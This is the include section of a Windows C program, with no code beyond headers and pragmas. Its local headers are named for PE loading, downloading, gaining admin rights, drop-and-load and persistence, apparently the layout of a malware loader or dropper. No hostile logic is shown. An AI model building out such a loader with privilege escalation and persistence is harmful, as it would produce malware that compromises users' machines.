#include <windows.h>
#include <winhttp.h>
#include <winternl.h>
#include <stdio.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <wchar.h>



#pragma warning (disable: 4996)
#define _CRT_SECURE_NO_WARNINGS


#include "peload.h"
#include "download.h"
#include "getAdmin.h"
#include "dropndload.h"
#include "pers.h"

#pragma comment(lib, "winhttp")


